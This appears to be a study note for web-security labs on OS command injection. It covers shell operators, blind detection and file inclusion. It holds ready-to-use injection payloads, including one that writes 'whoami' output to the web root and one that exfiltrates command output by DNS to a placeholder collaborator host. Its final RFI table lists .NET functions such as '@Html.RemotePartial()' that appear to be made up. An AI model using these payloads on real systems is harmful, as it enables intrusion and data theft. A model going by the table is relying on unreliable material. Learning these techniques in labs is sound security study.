#  Command Injection


## Lab Levels

Jump directly to the lab writeups:

* [APPRENTICE](./APPRENTICE_Lab.md)
* [PRACTITIONER](./PRACTITIONER_Lab.md)
  
## Introduction

OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.

<img width="781" height="440" alt="image" src="https://github.com/user-attachments/assets/e746f8d3-d2c9-4d92-a0ee-af0a08c5c006" />


# Types of Command Injection Vulnerabilities

## 1. In-band Command Injection
Here, the response of the executed command is received within the HTTP response.

### How to detect?
Use shell metacharacters: `&`, `;`, Newline (`0x0a` or `\n`), `&&`, `|`, `||`, `'`, `$`.

## 2. Blind Command Injection
Here, the output of the command is not returned within the HTTP response.

### How to detect?
- Trigger a time-delay using `ping` or `sleep` command.  
  e.g., `https://vulnerable-website/endpoint?parameter=x||ping -c 10 127.0.0.1||`  
  e.g., `https://vulnerable-website/endpoint?parameter=x & sleep 10 &`

- Output the response of the command to web root and access the file directly via a web browser.  
  e.g., `https://vulnerable-website/endpoint?parameter=||whoami>/var/www/images/output.txt||`

- Open an Out-of-Band channel to a server you control like Burp Collaborator.  
  e.g., `https://vulnerable-website/endpoint?parameter=x||nslookup burp.collaborator.address||`

**TIP**: Exfiltrate the output of your command:  
`https://vulnerable-website/endpoint?parameter=||nslookup \`whoami\`.burp.collaborator.address||`

## Some Vulnerable Functions
- `exec`
- `command`
- `execute`
- `ping`
- `query`
- `jump`
- `code`
- `reg`
- `do`
- `func`
- `arg`
- `option`
- `load`
- `process`
- `step`
- `read`
- `function`
- `req`
- `feature`
- `exe`
- `payload`
- `run`
- `print`

## Ways to Inject Commands
A variety of shell metacharacters can be used to perform OS command injection attacks.

### Command Separators
The following command separators work on both Windows and Unix-based systems:
- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:
- `;`
- Newline (`0x0a` or `\n`)

### Inline Execution (Unix-based systems only)
- Backticks: `` `injected command` ``
- Dollar character: `$(injected command)`

### Out-of-Band (OOB) Channel

Use a controlled server (e.g., Burp Collaborator) to detect DNS or HTTP requests.

**Example:**
`https://vulnerable-website/endpoint?parameter=x||nslookup+burp.collaborator.address||`

**Tip:** Exfiltrate command output via OOB:

**Example:**
`https://vulnerable-website/endpoint?parameter=||nslookup+\`whoami\`.burp.collaborator.address||`



# Command Injection with Operators

To inject an additional command to the intended one, we may use any of the following operators:

![image](https://github.com/user-attachments/assets/b5f941aa-bca4-4158-8d7c-b6d164258fd4)



Operators can be used to inject additional commands, allowing either or both commands to execute. The approach involves providing the expected input (e.g., an IP address), followed by an operator, and then the injected command.

## Supported Operators
The following operators can be used for command injection:
- **Cross-platform operators** (work on both Windows and Unix-based systems):
  - `&`
  - `&&`
  - `|`
  - `||`
- **Unix-only operators** (work on Linux and macOS, but not on Windows):
  - `;` (semicolon)
  - Newline (`0x0a` or `\n`)
  - Backticks: `` `injected command` ``
  - Sub-shell: `$(injected command)`

## Usage
To perform a command injection, append the operator and the malicious command to the expected input. For example:
- Expected input: `192.168.1.1`
- Injected command: `whoami`
- Example injection: `192.168.1.1;whoami` (on Unix-based systems)
- Example with sub-shell: `192.168.1.1$(whoami)` (Unix-only)

## Cross-Platform Compatibility
Command injection using these operators works regardless of the web application language (e.g., PHP, .NET, NodeJS), framework, or back-end server (Linux, macOS, or Windows). The operators are interpreted by the underlying operating system's shell, not the application layer.

### Exception
- The semicolon (`;`) operator **does not work** in Windows Command Line (CMD) but **does work** in Windows PowerShell.
- Unix-only operators (`` ` ` ``, `$()`) will not function on Windows systems.

## Tip
When targeting Linux or macOS systems, use Unix-specific operators like backticks (`` `command` ``) or sub-shell (`$(command)`) for inline command execution. For example:
- `192.168.1.1;whoami` (Unix-only)
- `192.168.1.1`whoami`` (Unix-only)
- `192.168.1.1$(whoami)` (Unix-only)

For Windows, stick to cross-platform operators like `&`, `&&`, `|`, or `||` to ensure compatibility.



## Read vs. Execute Functions | Local File Inclusion (LFI)
The most important thing to keep in mind is that some file inclusion functions only read the content of the specified files, while others also execute the specified files. Furthermore, some allow specifying remote URLs, while others only work with files local to the back-end server.

### Function Behavior

![image](https://github.com/user-attachments/assets/78353fc1-8978-44f7-a5bb-676c71b39439)


This table shows which functions may execute files and which only read file content.

### Key Notes
- **Executing files** may allow running functions and potentially achieve remote code execution (RCE).
- **Reading file content** lets you only view the source code, without code execution.


# Remote File Inclusion (RFI) in Vulnerable Functions

When a vulnerable function allows the inclusion of remote files, attackers can host a malicious script and include it in the vulnerable page to execute malicious functions, potentially achieving **remote code execution (RCE)**. Below is a table summarizing functions that, when vulnerable, may permit **Remote File Inclusion (RFI)**, based on their ability to read content or execute remote URLs.

## Function Behavior Table

| Function                  | Language       | Reads Content | Executes Remote URL                              |
|---------------------------|----------------|---------------|--------------------------------------------------|
| `include()` / `include_once()` | PHP            | ✅ Yes        | ✅ Yes (if `allow_url_include` is enabled)        |
| `file_get_contents()`     | PHP            | ✅ Yes        | ❌ No (only reads, doesn't execute)              |
| `import`                  | Java           | ❌ No         | ❌ No (used for class references)                |
| `@Html.RemotePartial()`   | .NET (Razor)   | ✅ Yes        | ✅ Yes (loads external HTML)                     |
| `include`                 | .NET           | ✅ Yes        | ✅ Yes (depending on usage context)              |

## Key Notes
- **RFI Exploitation**: Functions that allow remote URL inclusion (e.g., `include()` in PHP with `allow_url_include` enabled or `@Html.RemotePartial()` in .NET) are particularly dangerous, as attackers can host malicious scripts on a remote server and include them in the vulnerable application to execute code.
- **Execution vs. Reading**: Functions like `file_get_contents()` may read remote content but do not execute it, limiting their risk to data exposure rather than RCE.
